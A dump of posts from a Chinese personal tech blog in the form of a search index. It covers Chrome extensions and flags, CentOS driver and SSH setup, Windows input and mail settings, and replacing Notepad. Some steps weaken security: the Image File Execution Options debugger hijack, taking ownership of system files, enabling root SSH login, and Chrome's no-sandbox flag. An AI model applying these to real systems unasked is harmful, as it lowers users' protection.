这是个猴子脚本加载器,配合上各式脚本实现各式功能.如添加个BaiduPanDownloadHelper脚本,就可以在百度网盘里新增个批量下载的功能,脚本会自动将文件真实文件链接解析出来,这些链接直接复制粘贴到其他下载工具中,就可以实现百度网盘批量下载的功能了.这个结合百度网盘的离线BT下载,然后再批量下载回本地,非常爽. 其他作用 5.1 AutoPager Chrome 自动翻页的扩展，浏览论坛，百度和google中搜索不需要手动翻页，你只要负责往下滚动就可以了。 5.2 OnlineDict 咱总有些单词是不认识的，咱活到老学到老，不懂就查字典呗。没有金山词霸不要紧，OnlineDict跟着chrome一起，走到哪查到哪。 5.3 AutoCopy 这个看个人喜好，选中文字，自动帮你复制好了，想粘贴到哪就到哪。 5.4 IE Tab 身在天朝,总有一些SB银行等网站死守微软IE6,其他浏览器都懒得兼容,这就是天朝国企的霸道所在…对于这样的网站,我们只能说:我换IE打开就是了!但对于IE几乎不开的人来说,新开个IE页面麻烦,装了这个扩展,不兼容的网页直接点击扩展按钮就切换为用IE内核打开了,方便. 以上正是本人在用的或用过的扩展，功能都十分优秀。当然，优秀的扩展还有很多，不是说我们都需要安装，大家安需安装.同类的选择一个就可以了，实在都想要，就到chrome://extensions启用禁用呗，google会帮你自动同步。 在此，必须警告各位网友，扩展所把双刃剑，可以帮你杀敌，也可能在你家后院偷鸡，比如弹广告，改首页啥的，这个以前就遇到过chrome右下角弹升窗广告，以及chrome打开hao123时跳http://www.ttx123.cn，群众中总是有坏人,尤其是在天朝做软件开发的，大家多长个心眼。 如果出现chrome扩展安装失败，可以参考：解决chrome安装扩展失败问题","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"},{"name":"精简绿色去广告版","slug":"精简绿色去广告版","permalink":"https://sobaigu.com/tags/%E7%B2%BE%E7%AE%80%E7%BB%BF%E8%89%B2%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%89%88/"}]},{"title":"批量修改网站引用的点点图床链接","slug":"edit-pic-link-by-mysql","date":"2014-04-04T15:12:04.000Z","updated":"2024-09-28T00:17:21.254Z","comments":true,"path":"edit-pic-link-by-mysql.html","permalink":"https://sobaigu.com/edit-pic-link-by-mysql.html","excerpt":"为了节省博客流量,也相信专业图片站点的能力,更为了减少图片作为附件占用?p=id编号,本博客一直使用站外图床.原先使用的盛大糖果相册,可惜游戏老大在互联网节节败退,一个相册也没支持多久.后来改投点点轻博客,算是比较长久的一个图床了,速度也确实是比自己的站点快,也较省心。在此真心感谢点点厚道，不做图片盗链处理。","text":"为了节省博客流量,也相信专业图片站点的能力,更为了减少图片作为附件占用?p=id编号,本博客一直使用站外图床.原先使用的盛大糖果相册,可惜游戏老大在互联网节节败退,一个相册也没支持多久.后来改投点点轻博客,算是比较长久的一个图床了,速度也确实是比自己的站点快,也较省心。在此真心感谢点点厚道，不做图片盗链处理。 可最近发现图都显示一个叉了,到点点查看,图片都在.对比了下图片路径,发现点点把图床域名做了更改. http://m3.img.libdd.com/farm4/66/75EA6B7ABB269428FC667CD126D89642_738_569.PNG http://m3.img.srcdd.com/farm4/66/75EA6B7ABB269428FC667CD126D89642_738_569.PNG 点点图床有些是m1.img等，子域名有些许不同,但好歹路径更改都是有规律的,只要有规律就好办,咱mysql跑条批量替换语句就解决了. 还记得本博客之前写过一篇批量替换更换数据库表前缀的文章吗,想看的的请移步:[WordPress]登陆后台提示您没有足够的权限访问该页面解决办法 同理,此处也可使用此法,同样是登陆phpmyadmin进行操作,使用如下语句: 12345UPDATE `table_name` SET `field_name` = replace (`field_name`,&#x27;from_str&#x27;,&#x27;to_str&#x27;) WHERE `field_name` LIKE &#x27;%from_str%&#x27;/**注意 `table_name``field_name`两边并不是单引号,是上点号,与~同一个键上的那个 &#x27;from_str&#x27;,&#x27;to_str&#x27;这俩才是单引号**/ 图片链接是在文章页的内容中的,文章页对应的表是xxx_posts(xxx代表表前缀),内容则存储在post_content字段,知道这些就可以了,我们将其对号入座: 1UPDATE `sobaigu_posts` SET `post_content` = REPLACE( `post_content` , &#x27;libdd.com&#x27;, &#x27;srcdd.com&#x27; ) WHERE `post_content` LIKE &#x27;%libdd.com%&#x27; 点击执行,一两秒的功夫,整个数据库就搜寻完了,再打开那些带xx图片文章,图片再次复活，整个页面好看多了.","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"博客建站","slug":"博客建站","permalink":"https://sobaigu.com/tags/%E5%8D%9A%E5%AE%A2%E5%BB%BA%E7%AB%99/"}]},{"title":"CentOS安装无线网卡驱动","slug":"rtl8191sevb-wireless-for-centos","date":"2014-03-13T09:01:55.000Z","updated":"2024-09-28T00:17:21.254Z","comments":true,"path":"rtl8191sevb-wireless-for-centos.html","permalink":"https://sobaigu.com/rtl8191sevb-wireless-for-centos.html","excerpt":"","text":"有个比较老的笔记本,之前安装Windows xp系统,老是用一段时间就出现桌面无法启动或其他报错的问题.这个笔记本平时也就用来开个会,最多打开个文档或者PPT啥的,索性换了CentOS6.5练练手. 装好后也没啥,把liberoffice套件装上,该设置的简单设置了下.可发现,无线网卡无法识别. 查看了下网卡类别如下: 12[root@centos ~]# lspci | grep Network03:00.0 Network controller: Realtek Semiconductor Co., Ltd. RTL8191SEvB Wireless LAN Controller (rev 10) 到realtek官网搜索了下,没有这个型号的驱动,按网上说的,找了个相似的版本&quot;RTL8191SEvA&quot;,wget下载后tar解压,可make&amp;&amp;make install的时候各种&quot;make: *** [all] Error 2&quot;报错,始终无法编译成功,kernel-devel装上也没能编译好,和这哥们的情况一样:http://bbs.chinaunix.net/thread-3775815-1-1.html,最终放弃. 心想是不是centos6.5太新,而这个无线网卡芯片太老的缘故,将系统重装到5.10,可错误是一样的. 还好,最终在官方网站找到了一个帖子,照帖子里的方法安装成功. step1.确定网卡硬件ID 1for BUSID in $(/sbin/lspci | awk &#x27;&#123; IGNORECASE=1 &#125; /net/ &#123; print $1&#125;&#x27;); do /sbin/lspci -s $BUSID -m; /sbin/lspci -s $BUSID -n; done 以上命令shell执行过后,应该显示如下信息: [root@centos ~]# for BUSID in $(/sbin/lspci | awk ‘{ IGNORECASE=1 } /net/ { print $1 }’); do /sbin/lspci -s $BUSID -m; /sbin/lspci -s $BUSID -n; done 02:00.0 “Ethernet controller” “Realtek Semiconductor Co., Ltd.” “RTL8111/8168/8411 PCI Express Gigabit Ethernet Controller” -r03 “Realtek Semiconductor Co., Ltd.” “RTL8111/8168 PCI Express Gigabit Ethernet controller” 02:00.0 0200: 10ec:8168 (rev 03) 03:00.0 “Network controller” “Realtek Semiconductor Co., Ltd.” “RTL8191SEvB Wireless LAN Controller” -r10 “Realtek Semiconductor Co., Ltd.” “Device e020” 03:00.0 0280: 10ec:8172 (rev 10) 从返回的信息可见,联想x100e带的无线网卡硬件(rev 10)对应id为&quot;10ec:8172&quot;,到这可以查找到该ID对应的内核模块:http://elrepo.org/tiki/DeviceIDs&amp;highlight=10EC:8172 r8192se_pci.ko pci 10EC:8171 kmod-r8192se pci 10EC:8172 kmod-r8192se pci 10EC:8173 kmod-r8192se pci 10EC:8174 kmod-r8192se pci 10EC:8192 kmod-r8192se 从查找结果上可知,“RTL8191SEvB Wireless LAN Controller&quot;对应的内核模块为&quot;r8192se_pci.ko”. step2.添加第三方软件源 12public keyrpm --import https://www.elrepo.org/RPM-GPG-KEY-elrepo.org 直接拷贝英文吧,就不翻译了,相信折腾这的人都能看懂. 12345#To install ELRepo#for RHEL-5, SL-5 or CentOS-5:rpm -Uvh http://www.elrepo.org/elrepo-release-5-5.el5.elrepo.noarch.rpm#for RHEL-6, SL-6 or CentOS-6:rpm -Uvh http://www.elrepo.org/elrepo-release-6-6.el6.elrepo.noarch.rpm step3.安装对应模块 使用yum安装之前查找到的对应模块. 1234#针对之前安装过其他驱动套件,卸载掉防止冲突,没装过的执行一遍也无妨yum remove kmod-ndiswrapper ndiswrapper-utils#安装硬件ID对应内核模块yum install kmod-r8192se 使用下面这个命令将刚安装的模块加载起来 1modprobe r8192se_pci 到此,我们的无线网卡应该就可以正常识别了,剩下的就自行设置吧. 如果此时还无法识别,使用以下命令看下驱动模块是否正常被加载. 1lsmod | grep r8192 正常情况应该返回如下结果: [root@centos ~]# lsmod | grep r8192 r8192se_pci 509490 0 如果不正常,尝试重启系统看看. 某些情况可能造成开机无法加载无线模块,此时我们可以新建一个脚本,让系统启动时加载该模块. 1touch /etc/sysconfig/modules/wifi.modules wifi.modules里面的内容如下: 12&gt;#!/bin/shmodprobe r8192se_pci &amp;amp;amp;&amp;amp;gt;/dev/null 参考链接:https://www.centos.org/forums/viewtopic.php?t=7754","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://sobaigu.com/tags/Linux/"}]},{"title":"取消Ubuntu屏幕锁定","slug":"drop-password-for-screen-lock","date":"2014-03-12T15:48:47.000Z","updated":"2024-09-28T00:17:21.258Z","comments":true,"path":"drop-password-for-screen-lock.html","permalink":"https://sobaigu.com/drop-password-for-screen-lock.html","excerpt":"","text":"Ubuntu要是5分钟以上不动鼠标或者键盘,再次动的时候总是需要输入密码才能解锁,甚烦. 在Windows系统中我们知道这是屏幕保护程序所为,在桌面右键属性&gt;屏幕保护程序&gt;取消屏保或者将&quot;在恢复时需要输入密码&quot;取消勾选,保存就ok了. 在Ubuntu中同样是屏幕保护设置的问题,不过不是从桌面右键属性进. 按super键(就是一般印着Windows徽标的那个键了,mac上叫做command键),弹出程序管理界面&gt;查找screen,1204版本已经不叫screensaver了,改查找lock&gt;点击screensaver进入,看到设置没? 左上列表选择屏幕保护样式,右边框预览,还可以设置隔多久进入屏幕保护状态. 下方两个选择框,将lock screen when screensaver is active取消选择,点关闭,就再也不需要每次输入密码了.跟Windows的屏幕保护设置还是很像.","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://sobaigu.com/tags/Ubuntu/"}]},{"title":"解决vpn和内网不能同时连接问题","slug":"vpn-with-lan","date":"2014-02-17T21:07:22.000Z","updated":"2024-09-28T00:17:21.254Z","comments":true,"path":"vpn-with-lan.html","permalink":"https://sobaigu.com/vpn-with-lan.html","excerpt":"","text":"自己有个VPN服务器,有需要的时候就会连上翻墙啥的用用,可发现登录VPN的时候内网网页无法打开,内网桌面远程会被断开,总之无法在vpn连接状态下同时使用内网资源. 这个问题是因为VPN连接时使用了远程服务器的网关.当使用的网关与内网环境不一样时,将造成无法访问内网资源. 解决方法: step1:打开网络连接,找到vpn连接,直接在资源管理器粘贴控制面板\\网络和 Internet\\网络连接就直达了 step2:在vpn连接上右键&gt;属性 step3:切换到网络标签&gt;选中&quot;internet协议版本4&quot;,双击或点击右下方的属性 step4:在属性页面,可以看到常规选项,默认的不用管,点击&quot;高级&quot;按钮 step5:将&quot;在远程网络上使用默认网关(U)&quot;取消选择,点确认保存就可以了. 如果有特殊需求vpn翻墙用,那取消了使用远程网络默认网关的话估计翻不了.鱼和熊掌不可兼得,用的时候麻烦点,自己再改回来吧. 点此了解自己架设VPN服务器方法 点此了解VPN连接使用方法 参考文档:http://social.technet.microsoft.com/Forums/Windows/zh-CN/7e97c83a-941b-46d1-a328-51b379f6f0a6/Windows-7-vpn?forum=window7betacn","categories":[{"name":"攒知识","slug":"攒知识","permalink":"https://sobaigu.com/categories/%E6%94%92%E7%9F%A5%E8%AF%86/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://sobaigu.com/tags/Linux/"},{"name":"Windows","slug":"Windows","permalink":"https://sobaigu.com/tags/Windows/"}]},{"title":"Centos远程管理控制","slug":"new-centos","date":"2014-02-10T07:36:51.000Z","updated":"2024-09-28T00:17:21.254Z","comments":true,"path":"new-centos.html","permalink":"https://sobaigu.com/new-centos.html","excerpt":"","text":"用破机器新装了个centos,最新版本6.5图新鲜,折腾了好一会儿才搞定远程控制的事. 以前都是别人设置,还不知道有这么多边边角角需要处理,记录一二. 拔掉显卡无法登陆 破机器连显卡都没有,从别的地方拆下来一块插上,安装完系统设置好ip后放回机房,没想机器不通… 以为是网线没插牢,或者网线有问题,因为网卡灯不亮,换其他正在正常使用的网线也一样的,只好重新插显卡,可显示器接上看没有任何异常,网络也通的… 拔掉显卡再放回去,又不行了,原来显卡缺了就这样了,google一把,原来Centos启动需要加载一个背景图像,如果无显卡就会卡在那里无法启动,网络连通更无从谈起. 解决方法便是取消背景图像加载: #打开grub启动配置文件 [root@flowftp ~]# vi /etc/grub.conf #boot=/dev/sda default=0 timeout=5 splashimage=(hd0,0)/grub/splash.xpm.gz hiddenmenu initrd /initramfs-2.6.32-431.el6.x86_64.img 其中 splashimage=(hd0,0)/grub/splash.xpm.gz 就是加载图像部分脚本,我们在其前面加#注释掉,保存就可以了. 无法远程SSH或VNC连接 无显卡不能启动的问题搞定后,没试远程控制就急匆匆放回机房,结果还是远程不上,又是一番拆装显卡,看到居然ssh服务不可用. 首先看下ssh服务或vnc服务是否已经安装 [root@flowftp ~]# rpm -qa | grep vnc tigervnc-1.1.0-5.el6_4.1.x86_64 tigervnc-server-1.1.0-5.el6_4.1.x86_64 [root@flowftp ~]# rpm -qa | grep ssh libssh2-1.4.2-1.el6.x86_64 openssh-5.3p1-94.el6.x86_64 openssh-clients-5.3p1-94.el6.x86_64 openssh-askpass-5.3p1-94.el6.x86_64 openssh-server-5.3p1-94.el6.x86_64 [root@flowftp ~]# chkconfig | grep ssh sshd 0:关闭 1:关闭 2:关闭 3:关闭 4:关闭 5:关闭 6:关闭 [root@flowftp ~]# service sshd start 说明默认是已经安装了的,查看启动项是sshd服务开机不启动,vnc服务也一样.先启动服务,看下是否可以远程.启动后一切ok,防火墙啥的也应该默认放行了. 本来就没打算用图形界面,只把sshd服务设置开机启动. [root@flowftp ~]# chkconfig sshd on [root@flowftp ~]# chkconfig | grep ssh sshd 0:关闭 1:关闭 2:启用 3:启用 4:启用 5:启用 6:关闭 如果无法远程,那就修改下默认sshd配置. [root@flowftp ~]# vi /etc/ssh/sshd_config 以下项修改成这样: #去掉ServerKeyBits 1024前的# ServerKeyBits 1024 #PermitRootLogin=是否允许root账号登陆,自己的机器,当然允许了,去掉#,并yes PermitRootLogin yes #PermitEmptyPasswords=是否允许空密码登陆,这是不允许的,注释掉#,no PermitEmptyPasswords no 改完:wq保存,重启机器或sshd服务再测试,ok就可以拆显卡了. 默认启动字符界面 既然都只是ssh远程用,那就没必要启动图形界面了,免得浪费资源. 123456789101112[root@flowftp ~]# vi /etc/inittab# inittab is only used by upstart for the default runlevel.# Default runlevel. The runlevels used are:# 0 - halt (Do NOT set initdefault to this)# 1 - Single user mode# 2 - Multiuser, without NFS (The same as 3, if you do not have networking)# 3 - Full multiuser mode# 4 - unused# 5 - X11# 6 - reboot (Do NOT set initdefault to this)id:3:initdefault:#id:5:initdefault中5就是对应上面的x11图形界面,改成3就是文字界面了 保存重启,默认登陆到字符界面了,想使用图形界面的话登陆系统后输入: 1[root@flowftp ~]# startx Linux系统命令行设置IP,网关,DNS等方法详见: [Linux笔记]Linux命令行设置ip,DNS和gateway [Linux笔记]Ubuntu 12.04 LTS命令行设置IP及DNS","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://sobaigu.com/tags/Linux/"}]},{"title":"Windows自带邮箱客户端设置自动加邮件签名","slug":"auto-sign-for-your-mail","date":"2014-01-20T09:12:17.000Z","updated":"2024-09-28T00:17:21.254Z","comments":true,"path":"auto-sign-for-your-mail.html","permalink":"https://sobaigu.com/auto-sign-for-your-mail.html","excerpt":"","text":"最近换了win8.1,整体感觉良好.自带的邮箱客户端也还算顺手,但每次发邮件发现没带平常用的客户端签名. google了下官方的帮助,但没有提供该怎么设置的细节. http://office.microsoft.com/zh-cn/support/HA102834576.aspx 这个帮助里中间一段提及: 4.如果“邮件”启动时显示来自您以前设置的帐户的电子邮件，请执行下列操作： 如果您使用的是触控设备，请从屏幕的右边缘向内轻扫，然后选择“设置”。如果您使用的是鼠标，请指向屏幕右下角，然后单击“设置”。 就是图中这个了,在邮件页面,鼠标使劲往右下角靠,然后就弹出设置等浮层了… 我们一般在第一次的时候会弹出添加账号提示,过了后就很少关注.到现阶段我已经在在使用了,所以点击账号,将看到本机已登录的邮箱账号,这样就能给win8自带邮箱客户端设置自动加邮件签名了! 选择我们要添加或修改邮件签名的账号,然后就看到相关设置选项了…其他的就不多说了,只是官方的帮助把这些都省略了… 好了,win8改变了很多xp时代的习惯,大家慢慢适应吧.","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://sobaigu.com/tags/Windows/"}]},{"title":"win8.1-设置默认输入法为英文","slug":"english-input-method-by-default","date":"2014-01-02T09:10:22.000Z","updated":"2024-09-28T00:17:21.254Z","comments":true,"path":"english-input-method-by-default.html","permalink":"https://sobaigu.com/english-input-method-by-default.html","excerpt":"","text":"win8.1用着感觉还不错,虽然开始菜单等使用习惯和之前版本不太一样,但还是能够适应. 在win8.1中,安装时一旦选择默认语言,其输入习惯也会设置默认与显示语言一致. 虽然用的是中文版系统,但默认输入法如果是中文的话还是有诸多不便,如网址输入,如字母输入,cmd窗口输入命令等,所以我需要将系统默认输入法设置成英文状态. 在网上搜了下教程,找到过官网的链接,居然说没办法… 很显然官方回答人员显得不专业,设置方法如下: 打开以下路径: 控制面板\\时钟、语言和区域\\语言\\高级设置 这里在替代默认输入法下选择中文-(简体,中国)-美式键盘,并在切换输入法下勾选允许我为每个窗口设置不同的输入法,保存后再启动程序就不会是默认的中文输入法了. 当然,因为本机是中文界面,所以在语言栏中把英文的删除了,需要的可以自行添加英文输入法,这样在任务栏就会出现中和ENG切换.如果只有简体中文一种语言,则显示简体和中之间切换,显示简体时实际上是美式键盘的英文输入法. 设置默认英文输入可以设置系统默认英文输入法,也可以设置默认为搜狗输入法,然后搜狗中设置初始状态为英文,按shift键则切换为中文输入法,这样就达到目的了,和系统默认的微软输入法操作系统一样,可能更符合部分人的需求. 个人喜欢搜狗输入法,将多余的都删除了,有同样癖好的可以尝试下.","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://sobaigu.com/tags/Windows/"}]},{"title":"替换Windows系统自带记事本","slug":"replace-windows-notapad","date":"2013-12-27T16:23:58.000Z","updated":"2024-09-28T00:17:21.254Z","comments":true,"path":"replace-windows-notapad.html","permalink":"https://sobaigu.com/replace-windows-notapad.html","excerpt":"","text":"Windows自带的记事本打开一些简单的短小文本不错,但自带的这个记事本相应的也很残.比如查找替换功能,比如编码格式兼容问题… 为了使记事本使用更方便,我们有不少替代方案,比如 notepad2,notepad++,ultraedit… 个人比较喜欢notepad2-mod,替换分两种,一种直接改名为notepad.exe替换文件,另一种则是使用映像劫持,将名称为notepad.exe的进程劫持到我们指定的程序,以此实现启动记事本时打开我们要的notepad2.exe. 替换文件 Windows自带的notepad.exe在系统中有2~3份,64位系统则翻倍,其中必然有一份是源头,当系统发现Windows和system32目录下的notepad.exe不匹配时,则自带将其恢复. 对于xp或2003版本系统,用以下批处理即可完成: 12345678910rem just for xp or 2003rem 把notepad2.exe和批处理放同一目录copy notepad2.exe C:\\Windows\\system32\\dllcache\\notepad.exe /ycopy notepad2.exe c:\\Windows\\notepad.exe /ycopy notepad2.exe c:\\Windows\\system32\\notepad.exe /yrem notepad.ini是notepad2.exe的个性配置文件,如不需要则忽略copy notepad.ini c:\\Windows\\notepad.ini /ycopy notepad.ini c:\\Windows\\system32\\notepad.ini /yecho 替换完成pause 如果系统文件保护功能没有关闭,替换后会有系统文件更改提示,点保留更改即可. Windows Vista之后的系统版本系统权限控制大大加强,所以不能像Windows xp下那样直接替换文件,我们需要额外设置些系统权限才可以. 我这里装的是win8.1,权限设置和win7等是一样的,必须先得取得所有权,才可以更改用户权限. 文件夹权限设定完成后,将我们需要的notepad2.exe改名为notepad.exe,复制替换系统文件,如果想以后恢复,则建议将系统该文件改名备份处理. 当提示目标文件夹访问被拒绝时,点击&quot;继续&quot;按钮才可以. 此时,我们已经将文件替换完成,其他地方剩下的文件以此类推. 替换完成后,当我们打开txt或原notepad.exe关联的文件时,将调用新的notepad.exe打开,编辑网页,查看ini啥的还带格式,语法高亮,简直不是舒服一点… notepad2有个对应名称的配置,可以实现字体设置,语法主题设置等个性化配置,每次notepad2退出或F7时会保存在同目录的ini文件中.同样的,因为系统目录权限的问题,notepad2无法保存该配置,如果需要则可以在其他地方设置保存后将其复制到system32和Windows目录,因为之前notepad2已改名为notepad.exe,所以ini名称应该为notepad.ini. 至此,手工替换系统文件实现notepad2替代自带记事本就完成了. 当然,如果需要大量部署,要么自己封装系统的时候就替换好,要么可以尝试下批处理,从网上找了一段,未验证是否可行: 12345678910111213@echo offrem 取得所有权takeown /f %systemroot%\\notepad.exetakeown /f %systemroot%\\system32\\notepad.exetaskkill /f /im notepad.exe 2&gt;nulrem 备份原文件ren %windir%\\notepad.exe notepad.exe.bakicacls %windir%\\notepad.exe /grant %username%:f /ticacls %windir%\\system32\\notepad.exe /grant %username%:f /tcopy /y notepad.exe %windir%copy /y notepad.exe %windir%\\system32echo 替换完成notepad 此批处理只考虑了两个目标notepad.exe,且只用于32位版本系统,自己稍加发挥修改下吧. 映像劫持 其实notepad2官方提供的安装包采用的就是映像劫持方式,这种方式的优点是不用处理复杂的系统权限,也不对系统文件造成破坏,简单方便,推荐使用. 手工修改注册表实现映像劫持注册表如下: 1HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options 这个注册表项可以实现进程名劫持,官方注册表如下: 1234 Windows Registry Editor Version 5.00[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe]&quot;Debugger&quot;=&quot;\\&quot;C:\\\\Program Files\\\\Notepad2\\\\Notepad2.exe\\&quot; /z&quot; 这个注册表看着就很明白了,打开notepad.exe时实际上被转到了notepad2.exe.本机notepad2安装在Program Files目录下,自己改改路径到自己notepad2.exe所在目录就好了.如果不想折腾,直接下载官方提供的安装包吧:http://www.flos-freeware.ch/notepad2.html 为了让使用更方便,我们可以在系统右键添加一个使用记事本打开,当要打开的文档未做关联时,可以直接右键用记事本打开,提供一个注册表,将注册表导入即可. 1234567Windows Registry Editor Version 5.00[HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\*\\shell][HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\*\\shell\\OpenInNotepad];右键显示啥名自己写啦...装B先写把英文...@=&quot;Open with notepad&quot;[HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\*\\shell\\OpenInNotepad\\command]@=&quot;notepad.exe \\&quot;%1\\&quot;&quot; 替代记事本下载 现成的Windows自带记事本替代方案可见：notepad2-mod","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://sobaigu.com/tags/Windows/"}]},{"title":"DOS批量删除目录下的文件夹","slug":"bat-del-dir","date":"2013-12-13T13:51:47.000Z","updated":"2024-09-28T00:17:21.254Z","comments":true,"path":"bat-del-dir.html","permalink":"https://sobaigu.com/bat-del-dir.html","excerpt":"删除文件夹使用rd命令,但文件夹多了,难免有点烦,此时简单的批处理就派上大用处了,当然,使用搜索然后全选删除也不失为一种快捷的方法…","text":"删除文件夹使用rd命令,但文件夹多了,难免有点烦,此时简单的批处理就派上大用处了,当然,使用搜索然后全选删除也不失为一种快捷的方法… 12@rem for /r %%d in (.) do if exist &quot;%%d\\.svn&quot; echo /s /q &quot;%%d\\.svn&quot;@for /r %%d in (.) do if exist &quot;%%d\\.svn&quot; rd /s /q &quot;%%d\\.svn&quot; 把以上命令稍加润色,可以做出一些易用点的批处理. 12345678910111213141516@ECHO OFF@echo ===================================================================@echo 清除svn,vss,cvs标记文件@echo filename : clearSvnCvsVss.bat@echo ===================================================================@ECHO 按Ctrl + C取消。@pause@echo 执行批处理：%0@echo 转到：%1cd /d %1@echo (1)开始清除“.SVN”文件夹@rem for /r %%d in (.) do if exist &quot;%%d\\.svn&quot; echo /s /q &quot;%%d\\.svn&quot;@for /r %%d in (.) do if exist &quot;%%d\\.svn&quot; rd /s /q &quot;%%d\\.svn&quot;@echo 删除完后请检查是否清楚干净。考虑不同的编码工具带有自己的特殊标志，可根据具体情况修改批处理文件中的命令行。pauseexit 其他一些就自己按需求发挥了,实用才是王道.","categories":[{"name":"学编程","slug":"学编程","permalink":"https://sobaigu.com/categories/%E5%AD%A6%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://sobaigu.com/tags/Windows/"},{"name":"shell","slug":"shell","permalink":"https://sobaigu.com/tags/shell/"}]},{"title":"Google Chrome 参数设置及注册表下载","slug":"windows-google-chrome-option","date":"2013-11-22T15:48:30.000Z","updated":"2024-09-28T00:17:21.254Z","comments":true,"path":"windows-google-chrome-option.html","permalink":"https://sobaigu.com/windows-google-chrome-option.html","excerpt":"","text":"基础知识 1.Google Chrome 采用 WebKit 内核 ，并拥有目前最快的 JavaScript 引擎 V8 。 另外，它是多进程（Multi-process）模式的浏览器，所以当你打开多个标签页时，任务管理 器中会有多个相同的 chrome.exe ；这样，当一个标签页崩溃时，也不会影响到其他的标签页。 2.已经拥有的功能 (1) 隐私模式 (2) 换肤功能 (3) 类似 Greasemonkey 的User Scripts 功能 （使用参数 --enable-user-scripts 开启） (4) 支持扩展 （使用参数 --enable-extensions 开启） (5) 新标签页比 Opera 的Speed dial 更强大 (6) 一框多用：地址栏(omnibox)中直接显示搜索建议 (7) 支持ActiveX 下载及安装 1. Google Chrome 正式版 2. http://build.chromium.org/buildbot/snapshots/ 建议下载方法：查看最新版本数字， 然后直接进入下载页面http://build.chromium.org/buildbot/snapshots/chromium-rel-xp/ 最 新版本数字 /chrome-win32.zip ，得到的是官方免安装版本。 3.Chrome 和 Chromium 最大的区别是 Chrome 是 Google 在 Chromium 的基础上加工而成，集成了许多 Google 的服务，比如最近更新的书签同步到Google Docs ，Chromium 只有一个服务入口，但不能使用；由此可知真正开源的是 Chromium ，Chrome 并不开源或者说只是部分开源。 4.注意：以上版本基本都会自动添加google update 服务，以保证程序 及时升级到最新版本；如果不喜欢，建议使用 portable 版本 。 5.查看Chrome 用户配置文件 存 放位置，“开始”-“运行”：Vista下，%UserProfile%AppDataLocalGoogleChrome 、XP下，%UserProfile%Local SettingsApplication DataGoogleChrome ，如果希望 Chrome 配置文件存放在安装目录，则需要在Chrome的快捷方式中添加的命令行启动参数 “–user-data-dir=文件夹名称” （文件夹名称不要与已存在的文件夹的名称重复，当文件夹名称中间不存在空格时）。 6.为了缩减 Chrome 文件夹体积，可以删除Chrome目录中locales文件夹中除en-US.dll和zh-CN.dll外的其他文件。同时，可以设置cache文件的 大小，如最大值为40MB，则可添加参数 --disk-cache-size=41943040 。 参数 1.添加方法：右键“快捷方式”-“属性 ”-“目标”后（如果目标路径有引号，则在引号后）空格，输入参数；参数之间也需要空格，但是一项参数中不能有空格，如存在，则需要在此参数前后添加引号。 2.一些参数： –user-data-dir 自定义用户数据 目录 –start-maximized 启动就最大化 –no-sandbox 取消沙盒模式 –single-process 单进程运行 –process-per-tab 每个标签使用单独进程 –process-per-site 每个站点使用单独进程 –in-process-plugins 插件不启用单独进程 –disable-popup-blocking 禁用弹出拦截 –disable-javascript 禁用JavaScript –disable-java 禁用Java –disable-plugins 禁用插件 –disable-images 禁用图像 –incognito 启动进入隐身模式 –enable-udd-profiles 启用账户切换菜单 –proxy-pac-url 使用pac代理 [via 1/2] –lang=zh-CN 设置语言为简体中文 –disk-cache-dir 自定义缓存目录 –disk-cache-size 自定义缓存最大值（单位byte） –media-cache-size 自定义多媒体缓存最大值（单位byte） –bookmark-menu 在工具 栏增加一个书签按钮 –enable-sync 启用书签同步 about: 页面 about:version - 显示当前版本 about:plugins - 显示已安装插件 about:histograms - 显示历史记录 about:dns - 显示DNS状态 about:cache - 显示缓存页面 view-cache:stats - 缓存状态 about:memory - 查看内存和进程占用 chrome://extensions/ - 查看已经安装的扩展 扩展与UserScripts脚本 1.扩展使用方法：在快捷方式中添加参数 --enable-extensions （4.0.206.1以及之后版本不需要添加此参数即可使用扩展，需要禁用扩展，添加参数–disable-extensions），之后在网页上点击 .crx 后缀的扩展时，会自动进行下载和安装。 可以通过在地址栏输入 chrome://extensions/ ，查看和卸载已经安装的扩展。#最新版本在工具》扩展查看或者设置。 (1)广告屏蔽 adsweep http://adsweep.org/ 主要针对国外网站，而且已经停止更新。#这个不好用，已经有adblock转移过来了，Firefox用户很容易就上手。 (2)鼠标手势 nk-gesture http://nk-gesture.googlecode.com/ 支持自定义手势功能。 (3)超级拖拽 dragandgo 支持拖拽链接和拖拽文字搜索。 发现yet drag and go改进得不错，让dragandgo发扬光大了。 2.UserScripts脚本使用方法：在快捷方式中添加参数 